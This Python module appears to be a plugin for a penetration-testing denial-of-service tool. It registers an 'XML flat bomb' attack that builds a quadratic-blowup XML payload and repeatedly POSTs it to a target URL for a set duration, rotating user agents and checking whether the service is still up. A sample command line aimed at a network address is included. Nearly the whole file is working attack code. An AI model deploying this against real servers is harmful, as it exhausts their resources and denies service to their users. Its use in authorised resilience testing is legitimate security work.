"""ptdos extension that adds an xmlflatbomb attack"""
#python3 ptdos.py -a xmlflatbomb -xc 50000 -xb 50000 -dst http://192.168.0.80/xml -o bomb.xml

# own libs
from infrastructure import factory
from misc.pt_xml import build_quadratic, human_size
from monitoring.ptcheckservice import print_error, attack_append_out_data, attack_checkservice_review
from misc.pt_http import post_xml_bomb
from misc.globalfuncs import load_user_agents
# external libs
from dataclasses import dataclass
from ptlibs.ptprinthelper import ptprint,out_ifnot
from time import time, asctime, sleep


@dataclass
class XmlFlatBomb:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""

        count = args["xmlcount"]
        base_size = args["xmlbase"]
        output = args["output"]

        ptprint(out_ifnot(f"Begining construction, expected size: {human_size(base_size*count)}", "INFO", use_json))

        try:
            bomb = build_quadratic(count, base_size).encode("UTF-8")
        except ValueError as e:
            ptprint(out_ifnot(f"When building XML Flat Bomb error has occured: {e}", "ERROR", use_json))
            return

        if(output != ""):
            with open(output,"wb") as xml:
                xml.write(bomb)
                ptprint(out_ifnot(f"Saved payload locally to {output}", "INFO", use_json))

        if "127.0.0.1" in dst or "localhost" in dst:
            ptprint(out_ifnot("Local mode detected. Skipping HTTP delivery.", "INFO", use_json))
            return

        my_user_agents, my_accept_lang = load_user_agents()

        att_start_t_epoch = time()
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)
        ctx = 0
        try:
            while True:
                if time() - att_start_t_epoch >= duration:
                    monitoringprocess()
                    sleep(1)
                    att_end_t_asc = asctime()
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break

                if post_xml_bomb(dst, bomb, my_user_agents, my_accept_lang):
                    ctx += 1


        except BaseException as err:
            monitoringprocess()
            return print_error(json_obj, use_json, json_no, self.name, str(err))

        attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, ctx)
        monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

        return

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"XML Flat Bomb attack options": [
                ["-a", "--attack", "<attack>", "Attack name - xmlflatbomb"],
                ["-xc", "--xml-count", "<xml-count>", "Number of top-level entity references"],
                ["-xb", "--xml-base", "<xml-base>", "Size of the base entity in bytes"],
                ["-dst", "--destination", "<dst>", "Specify destination URL."],
                ["-o", "--output", "<output>", "Specify output for saving xml-bomb locally"]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""
        parser.add_argument("-xc", "--xml-count", dest="xmlcount", type=int, default=50000)

def register() -> None:
    """Register attack in factory."""
    factory.register("xmlflatbomb", XmlFlatBomb)
